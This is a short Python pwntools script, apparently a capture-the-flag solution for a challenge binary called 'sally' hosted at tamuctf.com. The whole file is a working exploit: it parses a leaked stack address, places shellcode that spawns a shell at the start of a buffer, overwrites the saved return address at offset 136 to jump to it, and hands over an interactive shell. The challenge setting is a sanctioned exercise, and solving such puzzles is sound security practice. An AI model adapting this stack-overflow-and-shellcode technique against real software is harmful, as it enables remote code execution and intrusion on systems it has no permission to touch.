#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("sally")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"

CHAL = "sally"

p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)

stack_addr = int(re.search("(0x[0-9a-fA-F]+)", p.recvline().decode()).group(1), 16)
log.info(f"stack addr: {hex(stack_addr)}")


payload = flat({
    0: asm(shellcraft.sh()),
    136: p64(stack_addr)
})

p.sendline(payload)

# good luck pwning :)

p.interactive()
